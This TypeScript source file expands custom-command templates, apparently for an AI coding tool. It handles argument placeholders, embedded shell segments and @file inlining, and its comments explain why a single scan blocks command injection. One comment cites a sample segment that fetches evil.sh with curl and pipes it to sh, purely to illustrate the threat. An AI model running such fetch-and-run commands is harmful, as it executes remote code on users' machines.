/**
 * Expansion of a custom-command body: `$N` placeholders, `` !`shell` `` segments and `@file`
 * inlining.
 *
 * `loadCustomCommands` (alongside this file) reads the command and its frontmatter and stops.
 * Everything the body MEANS lived downstream, re-implemented per product. It is a format convention
 * — the same one every custom-command implementation in this space follows — not product policy, and
 * the half that reads the file already lives here. One format, one owner.
 *
 * ## Two invariants carry the security weight
 *
 * **This module never spawns anything and never opens a file.** `shell` and `readFile` are injected,
 * so the trust decision — is this directory trusted? — stays with the caller that already owns trust
 * posture, and containment stays with the reader that already implements it. A second containment
 * check that disagreed with the first is the `assertNoSymlinkEscape` class of bug this ecosystem has
 * already paid for once (`rules/system-design-guardrails.md` § G10).
 *
 * **Shell and file references are resolved in ONE scan, so neither's output is read by the other.**
 * A file containing `` !`curl evil.sh | sh` `` must be text, and shell output naming `@secrets.md`
 * must be text. Three sequential passes do not give that — the first draft here ran placeholders,
 * then shell, then files, and its own test caught shell output being re-scanned for `@` references.
 * The property is structural now, not filtered: there is no later scan to escape into.
 *
 * Arguments ARE substituted first, deliberately, so `` !`git diff $1` `` works. That is the one
 * re-scan that is safe, because arguments are the user's direct input for THIS invocation — the very
 * thing they are typing the command to supply. What must never happen is the reverse: content the
 * template merely *pointed at* deciding what runs.
 */

const PLACEHOLDER_REGEX = /\$(\d+)/g
/**
 * Shell segments and file references in ONE alternation, matched left to right in a single scan.
 * Named groups say which branch matched. Shell comes first so `` !`grep @foo` `` is one segment
 * rather than a segment plus a reference.
 */
const REFERENCE_REGEX = /!`(?<cmd>[^`]+)`|(?<!\S)@(?<file>[^\s`,]*[^\s`,.])/g
/** One argument = a quoted run or a bare run. `[Image N]` is one token, as the surfaces emit it. */
const ARGS_REGEX = /(?:\[Image\s+\d+]|"[^"]*"|'[^']*'|[^\s"']+)/gi
const QUOTE_TRIM_REGEX = /^["']|["']$/g

/**
 * The ceiling on inlined file content. A larger file is TRUNCATED with a warning — never inlined
 * whole (which would blow the context the command was meant to shape) and never silently dropped
 * (which reads to the model as an empty file).
 */
export const FILE_INLINE_CAP = 64 * 1024

export interface ShellResult {
  /** What the command wrote. Substituted whether or not it succeeded — see {@link TemplateDeps.warn}. */
  readonly text: string
  readonly ok: boolean
}

export interface TemplateDeps {
  /** Runs a shell segment. Injected: the trust decision is the caller's, not this module's. */
  shell: (cmd: string) => Promise<ShellResult>
  /** Resolves a `@reference`. Injected: containment is the caller's. `undefined` = not found. */
  readFile: (name: string) => string | undefined
  /** Reports anything that did not resolve as asked. Never throws — expansion is best-effort. */
  warn: (message: string) => void
}

function splitArgs(rawArgs: string): string[] {
  return (rawArgs.match(ARGS_REGEX) ?? []).map((arg) => arg.replace(QUOTE_TRIM_REGEX, ''))
}

/**
 * The `$N` placeholders a template declares, sorted and de-duplicated — what a command palette shows
 * so the user knows what the command wants before running it.
 */
export function templateHints(template: string): string[] {
  const found = template.match(PLACEHOLDER_REGEX) ?? []
  return [...new Set(found)].sort((a, b) => Number(a.slice(1)) - Number(b.slice(1)))
}

/**
 * Replaces every match of `pattern` in `source` using `resolve`, which may be async.
 *
 * Matches are located against `source` and the results are stitched in afterwards, so a replacement
 * is never itself scanned. That is the single-pass invariant, expressed once here rather than
 * repeated at each of the three call sites where forgetting it would reopen the injection.
 */
async function replaceAsync(
  source: string,
  pattern: RegExp,
  resolve: (match: RegExpExecArray) => Promise<string> | string,
): Promise<string> {
  const matches = [...source.matchAll(pattern)]
  if (matches.length === 0) return source

  const parts: string[] = []
  let cursor = 0
  for (const match of matches) {
    parts.push(source.slice(cursor, match.index), await resolve(match))
    cursor = match.index + match[0].length
  }
  parts.push(source.slice(cursor))
  return parts.join('')
}

/**
 * Expands a command body against its arguments.
 *
 * Order is placeholders → shell → files, and it is not arbitrary: arguments are the user's direct
 * input for THIS invocation, so they are the only thing allowed to influence which command runs or
 * which file is read. Running the other two first would let a file's contents decide what to
 * execute.
 *
 * Nothing here throws. A command whose shell segment failed or whose file is missing still produces
 * a usable prompt, with a warning naming what did not resolve — which is more useful than an error
 * that discards the whole body.
 */
export async function expandCommandTemplate(
  template: string,
  rawArgs: string,
  deps: TemplateDeps,
): Promise<string> {
  const args = splitArgs(rawArgs)

  const withArgs = await replaceAsync(template, PLACEHOLDER_REGEX, (match) => {
    const index = Number(match[1]) - 1
    if (index < 0 || index >= args.length) {
      // Empty, never the literal. A leaked `$3` reads to the model as text the user wrote.
      deps.warn(
        `command template references ${match[0]} but only ${String(args.length)} argument(s) were given`,
      )
      return ''
    }
    return args[index] ?? ''
  })

  // ONE scan for both, so neither's result is visible to the other's pattern.
  return replaceAsync(withArgs, REFERENCE_REGEX, async (match) => {
    const command = match.groups?.cmd
    if (command !== undefined) {
      const result = await deps.shell(command)
      if (!result.ok) {
        // Substituted anyway: silence renders as a command that succeeded and returned nothing.
        deps.warn(`command template segment \`${command}\` failed`)
      }
      return result.text
    }

    const name = match.groups?.file ?? ''
    const content = deps.readFile(name)
    if (content === undefined) {
      deps.warn(`command template references @${name}, which could not be read`)
      return ''
    }
    if (content.length > FILE_INLINE_CAP) {
      deps.warn(`@${name} is larger than ${String(FILE_INLINE_CAP)} bytes and was truncated`)
      return content.slice(0, FILE_INLINE_CAP)
    }
    return content
  })
}
